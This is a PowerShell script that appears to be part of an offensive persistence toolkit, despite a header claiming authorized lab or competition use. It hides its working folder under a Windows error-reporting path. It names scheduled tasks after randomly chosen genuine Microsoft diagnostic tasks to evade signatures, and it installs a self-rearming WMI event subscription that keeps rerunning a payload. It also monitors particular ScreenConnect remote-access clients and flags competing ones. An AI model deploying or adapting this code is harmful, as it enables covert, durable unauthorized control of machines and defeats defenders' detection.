#Requires -Version 5.1
# ═══════════════════════════════════════════════════════════════
# OWN_LIB  BUILD 20260802L1
# Shared library: per-host identity (anti-signature), WMI watchdog
# (mutual persistence chain), campaign state file.
# Authorized internal deployment - lab/competition scope only.
# ═══════════════════════════════════════════════════════════════
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'state', 'identity')]
    [string]$Action,
    [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
    [string]$MonPath = '',
    [string]$Build  = 'O15',
    [string]$Extra  = ''
)

$ErrorActionPreference = 'SilentlyContinue'
$cfgPath = Join-Path $WorkDir 'identity.cfg'

# Legit-looking task-name pools; per-host hash picks one per slot.
$Pools = @{
    A = @('\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\DiskDiagnostic\Resolver','\Microsoft\Windows\MemoryDiagnostic\CorruptionDetector','\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem')
    B = @('\Microsoft\Windows\PLA\Server','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\DiskDiagnostic\Resolver','\Microsoft\Windows\MemoryDiagnostic\CorruptionVerifier','\Microsoft\Windows\WwanSvc\Notification')
    C = @('\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\WwanSvc\Notification','\Microsoft\Windows\DiskDiagnostic\Resolver','\Microsoft\Windows\Diagnosis\Scheduled')
    D = @('\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\WwanSvc\Notification','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\DiskDiagnostic\Resolver','\Microsoft\Windows\Diagnosis\Scheduled')
}
$Defaults = [ordered]@{
    TASK_A = '\Microsoft\Windows\Diagnosis\Scheduled'
    TASK_B = '\Microsoft\Windows\PLA\Server'
    TASK_C = '\Microsoft\Windows\WDI\ResolutionHost'
    TASK_D = '\Microsoft\Windows\Tcpip\IpAddressConflict1'
    MO_A   = '2'
    MO_B   = '3'
}

function Get-HostSeed {
    $s = 0L
    foreach ($c in $env:COMPUTERNAME.ToUpper().ToCharArray()) { $s = ($s * 31 + [int]$c) % 1000000007 }
    return $s
}

function Read-Identity {
    $id = $Defaults.Clone()
    if (Test-Path $cfgPath) {
        foreach ($line in (Get-Content -LiteralPath $cfgPath)) {
            if ($line -match '^\s*([A-Z_]+)\s*=\s*(.+?)\s*$') { $id[$matches[1]] = $matches[2] }
        }
    }
    return $id
}

function Initialize-Identity {
    # Idempotent: identity must never change once written (tasks depend on it).
    if (Test-Path $cfgPath) { return (Read-Identity) }
    $s = Get-HostSeed
    $cfg = @(
        "TASK_A=$($Pools.A[$s % 8])"
        "TASK_B=$($Pools.B[($s + 3) % 8])"
        "TASK_C=$($Pools.C[($s + 5) % 8])"
        "TASK_D=$($Pools.D[($s + 7) % 8])"
        "MO_A=$(2 + ($s % 4))"          # 2-5 min jitter
        "MO_B=$(3 + (($s + 1) % 3))"    # 3-5 min jitter
        "SEED=$s"
    )
    Set-Content -LiteralPath $cfgPath -Value $cfg -Force
    return (Read-Identity)
}

function Install-Watchdog {
    if (-not $MonPath) { return $false }
    $ok = $true
    try {
        Set-WmiInstance -Namespace root\subscription -Class __IntervalTimerInstruction `
            -Arguments @{ TimerId = 'WucacheWatchdog'; IntervalMilliseconds = 180000; SkipIfPassed = $false } | Out-Null
        $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
            -Arguments @{ Name = 'WucacheWatchdogF'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL';
                          Query = "SELECT * FROM __TimerEvent WHERE TimerId='WucacheWatchdog'" }
        $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
            -Arguments @{ Name = 'WucacheWatchdogC'; CommandLineTemplate = "cmd.exe /c `"$MonPath`""; RunInteractively = $false }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Arguments @{ Filter = $f; Consumer = $c } | Out-Null
    } catch { $ok = $false }
    return $ok
}

function Ensure-Watchdog {
    $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'"
    if ($null -eq $c) {
        Install-Watchdog | Out-Null
        return 'REARMED'
    }
    return 'OK'
}

function Update-State {
    $prim = $null; $alt = $null
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            if ($matches[1] -eq '5f6010579852e507') { $prim = "$($svc.Status)" }
            elseif ($matches[1] -eq 'f861c8140d453427') { $alt = "$($svc.Status)" }
        }
    }
    $foreign = @()
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)' -and $matches[1] -notin @('5f6010579852e507','f861c8140d453427')) {
            $foreign += $matches[1]
        }
    }
    $id = Read-Identity
    $tasksOk = 0; $tasksTotal = 0
    foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
        $tasksTotal++
        & schtasks.exe /Query /TN $id[$k] 2>&1 | Out-Null
        if ($LASTEXITCODE -eq 0) { $tasksOk++ }
    }
    $wd = Ensure-Watchdog
    $prev = @{}
    $statePath = Join-Path $WorkDir 'state.json'
    if (Test-Path $statePath) {
        try { (Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json).PSObject.Properties | ForEach-Object { $prev[$_.Name] = $_.Value } } catch {}
    }
    $installCount = 1
    if ($prev.installCount) { $installCount = [int]$prev.installCount }
    if ($prev.prim -and $prev.prim -ne 'Running' -and $prim -eq 'Running') { $installCount++ }
    $state = [ordered]@{
        host         = $env:COMPUTERNAME
        ts           = (Get-Date).ToUniversalTime().ToString('o')
        build        = $Build
        prim         = $(if ($prim) { $prim } else { 'MISSING' })
        alt          = $(if ($alt) { $alt } else { 'MISSING' })
        foreign      = $foreign
        tasksOk      = $tasksOk
        tasksTotal   = $tasksTotal
        watchdog     = $wd
        installCount = $installCount
        lastHeal     = $(if ($Extra) { (Get-Date).ToUniversalTime().ToString('o') } elseif ($prev.lastHeal) { $prev.lastHeal } else { $null })
        note         = $Extra
    }
    ($state | ConvertTo-Json -Compress) | Set-Content -LiteralPath $statePath -Force
    return $state
}

switch ($Action) {
    'init'            { $id = Initialize-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'identity'        { $id = Read-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'watchdog'        { Install-Watchdog | Out-Null }
    'watchdog-ensure' { Ensure-Watchdog }
    'state'           { Update-State | ConvertTo-Json -Compress }
}
